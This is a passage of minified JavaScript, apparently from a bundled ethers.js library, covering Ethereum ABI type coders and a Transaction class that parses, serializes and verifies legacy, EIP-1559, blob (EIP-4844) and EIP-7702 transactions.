from(e,n){return new ai(lf,e,n)}static uint8(e){return yt(e,8)}static uint16(e){return yt(e,16)}static uint24(e){return yt(e,24)}static uint32(e){return yt(e,32)}static uint40(e){return yt(e,40)}static uint48(e){return yt(e,48)}static uint56(e){return yt(e,56)}static uint64(e){return yt(e,64)}static uint72(e){return yt(e,72)}static uint80(e){return yt(e,80)}static uint88(e){return yt(e,88)}static uint96(e){return yt(e,96)}static uint104(e){return yt(e,104)}static uint112(e){return yt(e,112)}static uint120(e){return yt(e,120)}static uint128(e){return yt(e,128)}static uint136(e){return yt(e,136)}static uint144(e){return yt(e,144)}static uint152(e){return yt(e,152)}static uint160(e){return yt(e,160)}static uint168(e){return yt(e,168)}static uint176(e){return yt(e,176)}static uint184(e){return yt(e,184)}static uint192(e){return yt(e,192)}static uint200(e){return yt(e,200)}static uint208(e){return yt(e,208)}static uint216(e){return yt(e,216)}static uint224(e){return yt(e,224)}static uint232(e){return yt(e,232)}static uint240(e){return yt(e,240)}static uint248(e){return yt(e,248)}static uint256(e){return yt(e,256)}static uint(e){return yt(e,256)}static int8(e){return yt(e,-8)}static int16(e){return yt(e,-16)}static int24(e){return yt(e,-24)}static int32(e){return yt(e,-32)}static int40(e){return yt(e,-40)}static int48(e){return yt(e,-48)}static int56(e){return yt(e,-56)}static int64(e){return yt(e,-64)}static int72(e){return yt(e,-72)}static int80(e){return yt(e,-80)}static int88(e){return yt(e,-88)}static int96(e){return yt(e,-96)}static int104(e){return yt(e,-104)}static int112(e){return yt(e,-112)}static int120(e){return yt(e,-120)}static int128(e){return yt(e,-128)}static int136(e){return yt(e,-136)}static int144(e){return yt(e,-144)}static int152(e){return yt(e,-152)}static int160(e){return yt(e,-160)}static int168(e){return yt(e,-168)}static int176(e){return yt(e,-176)}static int184(e){return yt(e,-184)}static int192(e){return yt(e,-192)}static int200(e){return yt(e,-200)}static int208(e){return yt(e,-208)}static int216(e){return yt(e,-216)}static int224(e){return yt(e,-224)}static int232(e){return yt(e,-232)}static int240(e){return yt(e,-240)}static int248(e){return yt(e,-248)}static int256(e){return yt(e,-256)}static int(e){return yt(e,-256)}static bytes1(e){return Mn(e,1)}static bytes2(e){return Mn(e,2)}static bytes3(e){return Mn(e,3)}static bytes4(e){return Mn(e,4)}static bytes5(e){return Mn(e,5)}static bytes6(e){return Mn(e,6)}static bytes7(e){return Mn(e,7)}static bytes8(e){return Mn(e,8)}static bytes9(e){return Mn(e,9)}static bytes10(e){return Mn(e,10)}static bytes11(e){return Mn(e,11)}static bytes12(e){return Mn(e,12)}static bytes13(e){return Mn(e,13)}static bytes14(e){return Mn(e,14)}static bytes15(e){return Mn(e,15)}static bytes16(e){return Mn(e,16)}static bytes17(e){return Mn(e,17)}static bytes18(e){return Mn(e,18)}static bytes19(e){return Mn(e,19)}static bytes20(e){return Mn(e,20)}static bytes21(e){return Mn(e,21)}static bytes22(e){return Mn(e,22)}static bytes23(e){return Mn(e,23)}static bytes24(e){return Mn(e,24)}static bytes25(e){return Mn(e,25)}static bytes26(e){return Mn(e,26)}static bytes27(e){return Mn(e,27)}static bytes28(e){return Mn(e,28)}static bytes29(e){return Mn(e,29)}static bytes30(e){return Mn(e,30)}static bytes31(e){return Mn(e,31)}static bytes32(e){return Mn(e,32)}static address(e){return new ai(lf,"address",e)}static bool(e){return new ai(lf,"bool",!!e)}static bytes(e){return new ai(lf,"bytes",e)}static string(e){return new ai(lf,"string",e)}static array(e,n){throw new Error("not implemented yet")}static tuple(e,n){throw new Error("not implemented yet")}static overrides(e){return new ai(lf,"overrides",Object.assign({},e))}static isTyped(e){return e&&typeof e=="object"&&"_typedSymbol"in e&&e._typedSymbol===_G}static dereference(e,n){if(ai.isTyped(e)){if(e.type!==n)throw new Error(`invalid type: expecetd ${n}, got ${e.type}`);return e.value}return e}}class yMe extends Kf{constructor(e){super("address","address",e,!1)}defaultValue(){return"0x0000000000000000000000000000000000000000"}encode(e,n){let r=ai.dereference(n,"string");try{r=Vn(r)}catch(i){return this._throwError(i.message,n)}return e.writeValue(r)}decode(e){return Vn(Lp(e.readValue(),20))}}class bMe extends Kf{coder;constructor(e){super(e.name,e.type,"_",e.dynamic),this.coder=e}defaultValue(){return this.coder.defaultValue()}encode(e,n){return this.coder.encode(e,n)}decode(e){return this.coder.decode(e)}}function Jce(t,e,n){let r=[];if(Array.isArray(n))r=n;else if(n&&typeof n=="object"){let c={};r=e.map(l=>{const f=l.localName;return qe(f,"cannot encode object for signature with missing names","INVALID_ARGUMENT",{argument:"values",info:{coder:l},value:n}),qe(!c[f],"cannot encode object for signature with duplicate names","INVALID_ARGUMENT",{argument:"values",info:{coder:l},value:n}),c[f]=!0,n[f]})}else pe(!1,"invalid tuple value","tuple",n);pe(e.length===r.length,"types/value length mismatch","tuple",n);let i=new aD,s=new aD,o=[];e.forEach((c,l)=>{let f=r[l];if(c.dynamic){let h=s.length;c.encode(s,f);let m=i.writeUpdatableValue();o.push(b=>{m(b+h)})}else c.encode(i,f)}),o.forEach(c=>{c(i.length)});let a=t.appendWriter(i);return a+=t.appendWriter(s),a}function Xce(t,e){let n=[],r=[],i=t.subReader(0);return e.forEach(s=>{let o=null;if(s.dynamic){let a=t.readIndex(),c=i.subReader(a);try{o=s.decode(c)}catch(l){if(Ss(l,"BUFFER_OVERRUN"))throw l;o=l,o.baseType=s.name,o.name=s.localName,o.type=s.type}}else try{o=s.decode(t)}catch(a){if(Ss(a,"BUFFER_OVERRUN"))throw a;o=a,o.baseType=s.name,o.name=s.localName,o.type=s.type}if(o==null)throw new Error("investigate");n.push(o),r.push(s.localName||null)}),wf.fromItems(n,r)}class wMe extends Kf{coder;length;constructor(e,n,r){const i=e.type+"["+(n>=0?n:"")+"]",s=n===-1||e.dynamic;super("array",i,r,s),Lt(this,{coder:e,length:n})}defaultValue(){const e=this.coder.defaultValue(),n=[];for(let r=0;r<this.length;r++)n.push(e);return n}encode(e,n){const r=ai.dereference(n,"array");Array.isArray(r)||this._throwError("expected array value",r);let i=this.length;i===-1&&(i=r.length,e.writeValue(r.length)),ace(r.length,i,"coder array"+(this.localName?" "+this.localName:""));let s=[];for(let o=0;o<r.length;o++)s.push(this.coder);return Jce(e,s,r)}decode(e){let n=this.length;n===-1&&(n=e.readIndex(),qe(n*mo<=e.dataLength,"insufficient data length","BUFFER_OVERRUN",{buffer:e.bytes,offset:n*mo,length:e.dataLength}));let r=[];for(let i=0;i<n;i++)r.push(new bMe(this.coder));return Xce(e,r)}}class vMe extends Kf{constructor(e){super("bool","bool",e,!1)}defaultValue(){return!1}encode(e,n){const r=ai.dereference(n,"bool");return e.writeValue(r?1:0)}decode(e){return!!e.readValue()}}class eue extends Kf{constructor(e,n){super(e,e,n,!0)}defaultValue(){return"0x"}encode(e,n){n=po(n);let r=e.writeValue(n.length);return r+=e.writeBytes(n),r}decode(e){return e.readBytes(e.readIndex(),!0)}}class EMe extends eue{constructor(e){super("bytes",e)}decode(e){return rt(super.decode(e))}}class _Me extends Kf{size;constructor(e,n){let r="bytes"+String(e);super(r,r,n,!1),Lt(this,{size:e},{size:"number"})}defaultValue(){return"0x0000000000000000000000000000000000000000000000000000000000000000".substring(0,2+this.size*2)}encode(e,n){let r=po(ai.dereference(n,this.type));return r.length!==this.size&&this._throwError("incorrect data length",n),e.writeBytes(r)}decode(e){return rt(e.readBytes(this.size))}}const AMe=new Uint8Array([]);class CMe extends Kf{constructor(e){super("null","",e,!1)}defaultValue(){return null}encode(e,n){return n!=null&&this._throwError("not null",n),e.writeBytes(AMe)}decode(e){return e.readBytes(0),null}}const SMe=BigInt(0),TMe=BigInt(1),xMe=BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");class IMe extends Kf{size;signed;constructor(e,n,r){const i=(n?"int":"uint")+e*8;super(i,i,r,!1),Lt(this,{size:e,signed:n},{size:"number",signed:"boolean"})}defaultValue(){return 0}encode(e,n){let r=wt(ai.dereference(n,this.type)),i=Hm(xMe,mo*8);if(this.signed){let s=Hm(i,this.size*8-1);(r>s||r<-(s+TMe))&&this._throwError("value out-of-bounds",n),r=lce(r,8*mo)}else(r<SMe||r>Hm(i,this.size*8))&&this._throwError("value out-of-bounds",n);return e.writeValue(r)}decode(e){let n=Hm(e.readValue(),this.size*8);return this.signed&&(n=uI(n,this.size*8)),n}}class RMe extends eue{constructor(e){super("string",e)}defaultValue(){return""}encode(e,n){return super.encode(e,Hl(ai.dereference(n,"string")))}decode(e){return lI(super.decode(e))}}class l6 extends Kf{coders;constructor(e,n){let r=!1;const i=[];e.forEach(o=>{o.dynamic&&(r=!0),i.push(o.type)});const s="tuple("+i.join(",")+")";super("tuple",s,n,r),Lt(this,{coders:Object.freeze(e.slice())})}defaultValue(){const e=[];this.coders.forEach(r=>{e.push(r.defaultValue())});const n=this.coders.reduce((r,i)=>{const s=i.localName;return s&&(r[s]||(r[s]=0),r[s]++),r},{});return this.coders.forEach((r,i)=>{let s=r.localName;!s||n[s]!==1||(s==="length"&&(s="_length"),e[s]==null&&(e[s]=e[i]))}),Object.freeze(e)}encode(e,n){const r=ai.dereference(n,"tuple");return Jce(e,this.coders,r)}decode(e){return Xce(e,this.coders)}}function xO(t,e){return{address:Vn(t),storageKeys:e.map((n,r)=>(pe(gr(n,32),"invalid slot",`storageKeys[${r}]`,n),n.toLowerCase()))}}function ty(t){if(Array.isArray(t))return t.map((n,r)=>Array.isArray(n)?(pe(n.length===2,"invalid slot set",`value[${r}]`,n),xO(n[0],n[1])):(pe(n!=null&&typeof n=="object","invalid address-slot set","value",t),xO(n.address,n.storageKeys)));pe(t!=null&&typeof t=="object","invalid access list","value",t);const e=Object.keys(t).map(n=>{const r=t[n].reduce((i,s)=>(i[s]=!0,i),{});return xO(n,Object.keys(r).sort())});return e.sort((n,r)=>n.address.localeCompare(r.address)),e}function tue(t){return{address:Vn(t.address),nonce:wt(t.nonce!=null?t.nonce:0),chainId:wt(t.chainId!=null?t.chainId:0),signature:Lc.from(t.signature)}}function PMe(t){let e;return typeof t=="string"?e=yf.computePublicKey(t,!1):e=t.publicKey,Vn(Oi("0x"+e.substring(4)).substring(26))}function NMe(t,e){return PMe(yf.recoverPublicKey(t,e))}const ts=BigInt(0),OMe=BigInt(2),kMe=BigInt(27),DMe=BigInt(28),BMe=BigInt(35),jMe=BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"),MMe=Symbol.for("nodejs.util.inspect.custom"),IO=4096*32,YT=128;function UMe(t){return{blobToKzgCommitment:r=>{if("computeBlobProof"in t){if("blobToKzgCommitment"in t&&typeof t.blobToKzgCommitment=="function")return an(t.blobToKzgCommitment(rt(r)))}else if("blobToKzgCommitment"in t&&typeof t.blobToKzgCommitment=="function")return an(t.blobToKzgCommitment(r));if("blobToKZGCommitment"in t&&typeof t.blobToKZGCommitment=="function")return an(t.blobToKZGCommitment(rt(r)));pe(!1,"unsupported KZG library","kzg",t)},computeBlobKzgProof:(r,i)=>{if("computeBlobProof"in t&&typeof t.computeBlobProof=="function")return an(t.computeBlobProof(rt(r),rt(i)));if("computeBlobKzgProof"in t&&typeof t.computeBlobKzgProof=="function")return t.computeBlobKzgProof(r,i);if("computeBlobKZGProof"in t&&typeof t.computeBlobKZGProof=="function")return an(t.computeBlobKZGProof(rt(r),rt(i)));pe(!1,"unsupported KZG library","kzg",t)}}}function AG(t,e){let n=t.toString(16);for(;n.length<2;)n="0"+n;return n+=hw(e).substring(4),"0x"+n}function pw(t){return t==="0x"?null:Vn(t)}function S8(t,e){try{return ty(t)}catch(n){pe(!1,n.message,e,t)}}function LMe(t,e){try{if(!Array.isArray(t))throw new Error("authorizationList: invalid array");const n=[];for(let r=0;r<t.length;r++){const i=t[r];if(!Array.isArray(i))throw new Error(`authorization[${r}]: invalid array`);if(i.length!==6)throw new Error(`authorization[${r}]: wrong length`);if(!i[1])throw new Error(`authorization[${r}]: null address`);n.push({address:pw(i[1]),nonce:or(i[2],"nonce"),chainId:or(i[0],"chainId"),signature:Lc.from({yParity:ny(i[3],"yParity"),r:Ff(i[4],32),s:Ff(i[5],32)})})}return n}catch(n){pe(!1,n.message,e,t)}}function ny(t,e){return t==="0x"?0:Qt(t,e)}function or(t,e){if(t==="0x")return ts;const n=wt(t,e);return pe(n<=jMe,"value exceeds uint size",e,n),n}function _n(t,e){const n=wt(t,"value"),r=Di(n);return pe(r.length<=32,"value too large",`tx.${e}`,n),r}function T8(t){return ty(t).map(e=>[e.address,e.storageKeys])}function FMe(t){return t.map(e=>[_n(e.chainId,"chainId"),e.address,_n(e.nonce,"nonce"),_n(e.signature.yParity,"yParity"),Di(e.signature.r),Di(e.signature._s)])}function $Me(t,e){pe(Array.isArray(t),`invalid ${e}`,"value",t);for(let n=0;n<t.length;n++)pe(gr(t[n],32),"invalid ${ param } hash",`value[${n}]`,t[n]);return t}function HMe(t){const e=xA(t);pe(Array.isArray(e)&&(e.length===9||e.length===6),"invalid field count for legacy transaction","data",t);const n={type:0,nonce:ny(e[0],"nonce"),gasPrice:or(e[1],"gasPrice"),gasLimit:or(e[2],"gasLimit"),to:pw(e[3]),value:or(e[4],"value"),data:rt(e[5]),chainId:ts};if(e.length===6)return n;const r=or(e[6],"v"),i=or(e[7],"r"),s=or(e[8],"s");if(i===ts&&s===ts)n.chainId=r;else{let o=(r-BMe)/OMe;o<ts&&(o=ts),n.chainId=o,pe(o!==ts||r===kMe||r===DMe,"non-canonical legacy v","v",e[6]),n.signature=Lc.from({r:Ff(e[7],32),s:Ff(e[8],32),v:r})}return n}function zMe(t,e){const n=[_n(t.nonce,"nonce"),_n(t.gasPrice||0,"gasPrice"),_n(t.gasLimit,"gasLimit"),t.to||"0x",_n(t.value,"value"),t.data];let r=ts;if(t.chainId!=ts)r=wt(t.chainId,"tx.chainId"),pe(!e||e.networkV==null||e.legacyChainId===r,"tx.chainId/sig.v mismatch","sig",e);else if(t.signature){const s=t.signature.legacyChainId;s!=null&&(r=s)}if(!e)return r!==ts&&(n.push(Di(r)),n.push("0x"),n.push("0x")),Sf(n);let i=BigInt(27+e.yParity);return r!==ts?i=Lc.getChainIdV(r,e.v):BigInt(e.v)!==i&&pe(!1,"tx.chainId/sig.v mismatch","sig",e),n.push(Di(i)),n.push(Di(e.r)),n.push(Di(e._s)),Sf(n)}function x8(t,e){let n;try{if(n=ny(e[0],"yParity"),n!==0&&n!==1)throw new Error("bad yParity")}catch{pe(!1,"invalid yParity","yParity",e[0])}const r=Ff(e[1],32),i=Ff(e[2],32),s=Lc.from({r,s:i,yParity:n});t.signature=s}function qMe(t){const e=xA(an(t).slice(1));pe(Array.isArray(e)&&(e.length===9||e.length===12),"invalid field count for transaction type: 2","data",rt(t));const n={type:2,chainId:or(e[0],"chainId"),nonce:ny(e[1],"nonce"),maxPriorityFeePerGas:or(e[2],"maxPriorityFeePerGas"),maxFeePerGas:or(e[3],"maxFeePerGas"),gasPrice:null,gasLimit:or(e[4],"gasLimit"),to:pw(e[5]),value:or(e[6],"value"),data:rt(e[7]),accessList:S8(e[8],"accessList")};return e.length===9||x8(n,e.slice(9)),n}function VMe(t,e){const n=[_n(t.chainId,"chainId"),_n(t.nonce,"nonce"),_n(t.maxPriorityFeePerGas||0,"maxPriorityFeePerGas"),_n(t.maxFeePerGas||0,"maxFeePerGas"),_n(t.gasLimit,"gasLimit"),t.to||"0x",_n(t.value,"value"),t.data,T8(t.accessList||[])];return e&&(n.push(_n(e.yParity,"yParity")),n.push(Di(e.r)),n.push(Di(e.s))),Lr(["0x02",Sf(n)])}function WMe(t){const e=xA(an(t).slice(1));pe(Array.isArray(e)&&(e.length===8||e.length===11),"invalid field count for transaction type: 1","data",rt(t));const n={type:1,chainId:or(e[0],"chainId"),nonce:ny(e[1],"nonce"),gasPrice:or(e[2],"gasPrice"),gasLimit:or(e[3],"gasLimit"),to:pw(e[4]),value:or(e[5],"value"),data:rt(e[6]),accessList:S8(e[7],"accessList")};return e.length===8||x8(n,e.slice(8)),n}function GMe(t,e){const n=[_n(t.chainId,"chainId"),_n(t.nonce,"nonce"),_n(t.gasPrice||0,"gasPrice"),_n(t.gasLimit,"gasLimit"),t.to||"0x",_n(t.value,"value"),t.data,T8(t.accessList||[])];return e&&(n.push(_n(e.yParity,"recoveryParam")),n.push(Di(e.r)),n.push(Di(e.s))),Lr(["0x01",Sf(n)])}function KMe(t){let e=xA(an(t).slice(1)),n="3",r=null,i=null;if(e.length===4&&Array.isArray(e[0])){n="3 (network format)";const o=e[1],a=e[2],c=e[3];pe(Array.isArray(o),"invalid network format: blobs not an array","fields[1]",o),pe(Array.isArray(a),"invalid network format: commitments not an array","fields[2]",a),pe(Array.isArray(c),"invalid network format: proofs not an array","fields[3]",c),pe(o.length===a.length,"invalid network format: blobs/commitments length mismatch","fields",e),pe(o.length===c.length,"invalid network format: blobs/proofs length mismatch","fields",e),i=[];for(let l=0;l<e[1].length;l++)i.push({data:o[l],commitment:a[l],proof:c[l]});e=e[0]}else if(e.length===5&&Array.isArray(e[0])){n="3 (EIP-7594 network format)",r=Qt(e[1]);const o=e[2],a=e[3],c=e[4];pe(r===1,`unsupported EIP-7594 network format version: ${r}`,"fields[1]",r),pe(Array.isArray(o),"invalid EIP-7594 network format: blobs not an array","fields[2]",o),pe(Array.isArray(a),"invalid EIP-7594 network format: commitments not an array","fields[3]",a),pe(Array.isArray(c),"invalid EIP-7594 network format: proofs not an array","fields[4]",c),pe(o.length===a.length,"invalid network format: blobs/commitments length mismatch","fields",e),pe(o.length*YT===c.length,"invalid network format: blobs/proofs length mismatch","fields",e),i=[];for(let l=0;l<o.length;l++){const f=[];for(let h=0;h<YT;h++)f.push(c[l*YT+h]);i.push({data:o[l],commitment:a[l],proof:Lr(f)})}e=e[0]}pe(Array.isArray(e)&&(e.length===11||e.length===14),`invalid field count for transaction type: ${n}`,"data",rt(t));const s={type:3,chainId:or(e[0],"chainId"),nonce:ny(e[1],"nonce"),maxPriorityFeePerGas:or(e[2],"maxPriorityFeePerGas"),maxFeePerGas:or(e[3],"maxFeePerGas"),gasPrice:null,gasLimit:or(e[4],"gasLimit"),to:pw(e[5]),value:or(e[6],"value"),data:rt(e[7]),accessList:S8(e[8],"accessList"),maxFeePerBlobGas:or(e[9],"maxFeePerBlobGas"),blobVersionedHashes:e[10],blobWrapperVersion:r};i&&(s.blobs=i),pe(s.to!=null,`invalid address for transaction type: ${n}`,"data",t),pe(Array.isArray(s.blobVersionedHashes),"invalid blobVersionedHashes: must be an array","data",t);for(let o=0;o<s.blobVersionedHashes.length;o++)pe(gr(s.blobVersionedHashes[o],32),`invalid blobVersionedHash at index ${o}: must be length 32`,"data",t);return e.length===11||x8(s,e.slice(11)),s}function ZMe(t,e,n){const r=[_n(t.chainId,"chainId"),_n(t.nonce,"nonce"),_n(t.maxPriorityFeePerGas||0,"maxPriorityFeePerGas"),_n(t.maxFeePerGas||0,"maxFeePerGas"),_n(t.gasLimit,"gasLimit"),t.to||x_,_n(t.value,"value"),t.data,T8(t.accessList||[]),_n(t.maxFeePerBlobGas||0,"maxFeePerBlobGas"),$Me(t.blobVersionedHashes||[],"blobVersionedHashes")];if(e&&(r.push(_n(e.yParity,"yParity")),r.push(Di(e.r)),r.push(Di(e.s)),n)){if(t.blobWrapperVersion!=null){const i=Di(t.blobWrapperVersion),s=[];for(const{proof:o}of n){const a=an(o),c=a.length/YT;for(let l=0;l<a.length;l+=c)s.push(a.subarray(l,l+c))}return Lr(["0x03",Sf([r,i,n.map(o=>o.data),n.map(o=>o.commitment),s])])}return Lr(["0x03",Sf([r,n.map(i=>i.data),n.map(i=>i.commitment),n.map(i=>i.proof)])])}return Lr(["0x03",Sf(r)])}function YMe(t){const e=xA(an(t).slice(1));pe(Array.isArray(e)&&(e.length===10||e.length===13),"invalid field count for transaction type: 4","data",rt(t));const n={type:4,chainId:or(e[0],"chainId"),nonce:ny(e[1],"nonce"),maxPriorityFeePerGas:or(e[2],"maxPriorityFeePerGas"),maxFeePerGas:or(e[3],"maxFeePerGas"),gasPrice:null,gasLimit:or(e[4],"gasLimit"),to:pw(e[5]),value:or(e[6],"value"),data:rt(e[7]),accessList:S8(e[8],"accessList"),authorizationList:LMe(e[9],"authorizationList")};return e.length===10||x8(n,e.slice(10)),n}function QMe(t,e){const n=[_n(t.chainId,"chainId"),_n(t.nonce,"nonce"),_n(t.maxPriorityFeePerGas||0,"maxPriorityFeePerGas"),_n(t.maxFeePerGas||0,"maxFeePerGas"),_n(t.gasLimit,"gasLimit"),t.to||"0x",_n(t.value,"value"),t.data,T8(t.accessList||[]),FMe(t.authorizationList||[])];return e&&(n.push(_n(e.yParity,"yParity")),n.push(Di(e.r)),n.push(Di(e.s))),Lr(["0x04",Sf(n)])}class xu{#e;#t;#n;#r;#i;#o;#s;#a;#d;#u;#p;#m;#c;#l;#f;#h;#b;#g;get type(){return this.#e}set type(e){switch(e){case null:this.#e=null;break;case 0:case"legacy":this.#e=0;break;case 1:case"berlin":case"eip-2930":this.#e=1;break;case 2:case"london":case"eip-1559":this.#e=2;break;case 3:case"cancun":case"eip-4844":this.#e=3;break;case 4:case"pectra":case"eip-7702":this.#e=4;break;default:pe(!1,"unsupported transaction type","type",e)}}get typeName(){switch(this.type){case 0:return"legacy";case 1:return"eip-2930";case 2:return"eip-1559";case 3:return"eip-4844";case 4:return"eip-7702"}return null}get to(){const e=this.#t;return e==null&&this.type===3?x_:e}set to(e){this.#t=e==null?null:Vn(e)}get nonce(){return this.#r}set nonce(e){this.#r=Qt(e,"value")}get gasLimit(){return this.#i}set gasLimit(e){this.#i=wt(e)}get gasPrice(){const e=this.#o;return e==null&&(this.type===0||this.type===1)?ts:e}set gasPrice(e){this.#o=e==null?null:wt(e,"gasPrice")}get maxPriorityFeePerGas(){const e=this.#s;return e??(this.type===2||this.type===3?ts:null)}set maxPriorityFeePerGas(e){this.#s=e==null?null:wt(e,"maxPriorityFeePerGas")}get maxFeePerGas(){const e=this.#a;return e??(this.type===2||this.type===3?ts:null)}set maxFeePerGas(e){this.#a=e==null?null:wt(e,"maxFeePerGas")}get data(){return this.#n}set data(e){this.#n=rt(e)}get value(){return this.#d}set value(e){this.#d=wt(e,"value")}get chainId(){return this.#u}set chainId(e){this.#u=wt(e)}get signature(){return this.#p||null}set signature(e){this.#p=e==null?null:Lc.from(e)}isValid(){const e=this.signature;if(e&&!e.isValid())return!1;const n=this.authorizationList;if(n){for(const r of n)if(!r.signature.isValid())return!1}return!0}get accessList(){const e=this.#m||null;return e??(this.type===1||this.type===2||this.type===3?[]:null)}set accessList(e){this.#m=e==null?null:ty(e)}get authorizationList(){const e=this.#b||null;return e==null&&this.type===4?[]:e}set authorizationList(e){this.#b=e==null?null:e.map(n=>tue(n))}get maxFeePerBlobGas(){const e=this.#c;return e==null&&this.type===3?ts:e}set maxFeePerBlobGas(e){this.#c=e==null?null:wt(e,"maxFeePerBlobGas")}get blobVersionedHashes(){let e=this.#l;return e==null&&this.type===3?[]:e}set blobVersionedHashes(e){if(e!=null){pe(Array.isArray(e),"blobVersionedHashes must be an Array","value",e),e=e.slice();for(let n=0;n<e.length;n++)pe(gr(e[n],32),"invalid blobVersionedHash",`value[${n}]`,e[n])}this.#l=e}get blobs(){return this.#h==null?null:this.#h.map(e=>Object.assign({},e))}set blobs(e){if(e==null){this.#h=null;return}const n=[],r=[];for(let i=0;i<e.length;i++){const s=e[i];if(hj(s)){qe(this.#f,"adding a raw blob requires a KZG library","UNSUPPORTED_OPERATION",{operation:"set blobs()"});let o=an(s);if(pe(o.length<=IO,"blob is too large",`blobs[${i}]`,s),o.length!==IO){const l=new Uint8Array(IO);l.set(o),o=l}const a=this.#f.blobToKzgCommitment(o),c=rt(this.#f.computeBlobKzgProof(o,a));n.push({data:rt(o),commitment:rt(a),proof:c}),r.push(AG(1,a))}else{const o=rt(s.data),a=rt(s.commitment),c=rt(s.proof);n.push({data:o,commitment:a,proof:c}),r.push(AG(1,a))}}this.#h=n,this.#l=r}get kzg(){return this.#f}set kzg(e){e==null?this.#f=null:this.#f=UMe(e)}get blobWrapperVersion(){return this.#g}set blobWrapperVersion(e){this.#g=e}constructor(){this.#e=null,this.#t=null,this.#r=0,this.#i=ts,this.#o=null,this.#s=null,this.#a=null,this.#n="0x",this.#d=ts,this.#u=ts,this.#p=null,this.#m=null,this.#c=null,this.#l=null,this.#f=null,this.#h=null,this.#b=null,this.#g=null}get hash(){return this.signature==null?null:Oi(this.#y(!0,!1))}get unsignedHash(){return Oi(this.unsignedSerialized)}get from(){return this.signature==null?null:NMe(this.unsignedHash,this.signature.getCanonical())}get fromPublicKey(){return this.signature==null?null:yf.recoverPublicKey(this.unsignedHash,this.signature.getCanonical())}isSigned(){return this.signature!=null}#y(e,n){qe(!e||this.signature!=null,"cannot serialize unsigned transaction; maybe you meant .unsignedSerialized","UNSUPPORTED_OPERATION",{operation:".serialized"});const r=e?this.signature:null;switch(this.inferType()){case 0:return zMe(this,r);case 1:return GMe(this,r);case 2:return VMe(this,r);case 3:return ZMe(this,r,n?this.blobs:null);case 4:return QMe(this,r)}qe(!1,"unsupported transaction type","UNSUPPORTED_OPERATION",{operation:".serialized"})}get serialized(){return this.#y(!0,!0)}get unsignedSerialized(){return this.#y(!1,!1)}inferType(){const e=this.inferTypes();return e.indexOf(2)>=0?2:e.pop()}inferTypes(){const e=this.gasPrice!=null,n=this.maxFeePerGas!=null||this.maxPriorityFeePerGas!=null,r=this.accessList!=null,i=this.#c!=null||this.#l;this.maxFeePerGas!=null&&this.maxPriorityFeePerGas!=null&&qe(this.maxFeePerGas>=this.maxPriorityFeePerGas,"priorityFee cannot be more than maxFee","BAD_DATA",{value:this}),qe(!n||this.type!==0&&this.type!==1,"transaction type cannot have maxFeePerGas or maxPriorityFeePerGas","BAD_DATA",{value:this}),qe(this.type!==0||!r,"legacy transaction cannot have accessList","BAD_DATA",{value:this});const s=[];return this.type!=null?s.push(this.type):this.authorizationList&&this.authorizationList.length?s.push(4):n?s.push(2):e?(s.push(1),r||s.push(0)):r?(s.push(1),s.push(2)):(i&&this.to||(s.push(0),s.push(1),s.push(2)),s.push(3)),s.sort(),s}isLegacy(){return this.type===0}isBerlin(){return this.type===1}isLondon(){return this.type===2}isCancun(){return this.type===3}clone(){return xu.from(this)}toJSON(){const e=n=>n==null?null:n.toString();return{type:this.type,to:this.to,data:this.data,nonce:this.nonce,gasLimit:e(this.gasLimit),gasPrice:e(this.gasPrice),maxPriorityFeePerGas:e(this.maxPriorityFeePerGas),maxFeePerGas:e(this.maxFeePerGas),value:e(this.value),chainId:e(this.chainId),sig:this.signature?this.signature.toJSON():null,accessList:this.accessList}}[MMe](){return this.toString()}toString(){const e=[],n=i=>{let s=this[i];typeof s=="string"&&(s=JSON.stringify(s)),e.push(`${i}: ${s}`)};this.type&&n("type"),n("to"),n("data"),n("nonce"),n("gasLimit"),n("value"),this.chainId!=null&&n("chainId"),this.signature&&(n("from"),e.push(`signature: ${this.signature.toString()}`));const r=this.authorizationList;if(r){const i=[];for(const s of r){const o=[];o.push(`address: ${JSON.stringify(s.address)}`),s.nonce!=null&&o.push(`nonce: ${s.nonce}`),s.chainId!=null&&o.push(`chainId: ${s.chainId}`),s.signature&&o.push(`signature: ${s.signature.toString()}`),i.push(`Authorization { ${o.join(", ")} }`)}e.push(`authorizations: [ ${i.join(", ")} ]`)}return`Transaction { ${e.join(", ")} }`}static from(e){if(e==null)return new xu;if(typeof e=="string"){const r=an(e);if(r[0]>=127)return xu.from(HMe(r));switch(r[0]){case 1:return xu.from(WMe(r));case 2:return xu.from(qMe(r));case 3:return xu.from(KMe(r));case 4:return xu.from(YMe(r))}qe(!1,"unsupported transaction type","UNSUPPORTED_OPERATION",{operation:"from"})}const n=new xu;return e.type!=null&&(n.type=e.type),e.to!=null&&(n.to=e.to),e.nonce!=null&&(n.nonce=e.nonce),e.gasLimit!=null&&(n.gasLimit=e.gasLimit),e.gasPrice!=null&&(n.gasPrice=e.gasPrice),e.maxPriorityFeePerGas!=null&&(n.maxPriorityFeePerGas=e.maxPriorityFeePerGas),e.maxFeePerGas!=null&&(n.maxFeePerGas=e.maxFeePerGas),e.maxFeePerBlobGas!=null&&(n.maxFeePerBlobGas=e.maxFeePerBlobGas),e.data!=null&&(n.data=e.data),e.value!=null&&(n.value=e.value),e.chainId!=null&&(n.chainId=e.chainId),e.signature!=null&&(n.signature=Lc.from(e.signature)),e.accessList!=null&&(n.accessList=e.accessList),e.authorizationList!=null&&(n.authorizationList=e.authorizationList),e.blobVersionedHashes!=null&&(n.blobVersionedHashes=e.blobVersionedHashes),e.kzg!=null&&(n.kzg=e.kzg),e.blobWrapperVersion!=null&&(n.blobWrapperVersion=e.blobWrapperVersion),e.blobs!=null&&(n.blobs=e.blobs),e.hash!=null&&(pe(n.isSigned(),"unsigned transaction cannot define '.hash'","tx",e),pe(n.hash===e.hash,"hash mismatch","tx",e)),e.from!=null&&(pe(n.isSigned(),"unsigned transaction cannot define '.from'","tx",e),pe(n.from.toLowerCase()===(e.from||"").toLowerCase(),"from mismatch","tx",e)),n}}function Rg(t){return Oi(Hl(t))}var 